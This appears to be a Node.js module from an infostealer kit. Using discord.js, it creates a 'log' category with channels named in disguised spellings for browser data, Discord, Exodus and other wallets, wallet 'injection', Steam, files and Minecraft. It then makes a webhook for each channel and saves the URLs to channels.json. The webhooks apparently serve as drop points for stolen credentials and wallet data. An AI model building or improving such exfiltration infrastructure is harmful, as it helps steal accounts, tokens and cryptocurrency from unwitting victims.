const fs = require('fs');
const path = require('path');
const { ChannelType } = require('discord.js');

async function createChannelsAndSaveWebhooks(guild) {
    const configFilePath = path.join(__dirname, '../channels.json');

    let config = {};
    try {
        if (fs.existsSync(configFilePath)) {
            const data = fs.readFileSync(configFilePath, 'utf8');
            config = JSON.parse(data);
        }
    } catch (error) {
        console.error("Error occurred while reading channels.json:", error);
    }

    try {
        const logCategory = await guild.channels.create({
            name: 'log',
            type: ChannelType.GuildCategory
        });
        console.log('📁 Category created: log');

        const channelNames = [
            'br0wser', 'dxscord', 'ex0dus', 'w4llet',
            'w4llet-1njection', '1njection', 'pan3lping',
            'ste4m', 'f1les', 'm1necraft'
        ];

        const result = {
            serverID: guild.id,
            channels: {}
        };

        for (const name of channelNames) {
            const channel = await guild.channels.create({
                name: name,
                type: ChannelType.GuildText,
                parent: logCategory
            });

            console.log(`📄 Channel created: ${name}`);

            const webhook = await channel.createWebhook({
                name: `${name}_webhook`
            });

            console.log(`🔗 Webhook created for ${name}: ${webhook.url}`);

            result.channels[name] = {
                id: channel.id,
                webhookURL: webhook.url
            };
        }

        fs.writeFileSync(configFilePath, JSON.stringify(result, null, 2));
        console.log('✅ Webhooks and channels successfully saved to channels.json.');
    } catch (error) {
        console.error('❌ Error while creating channels or webhooks:', error);
    }
}

module.exports = createChannelsAndSaveWebhooks;
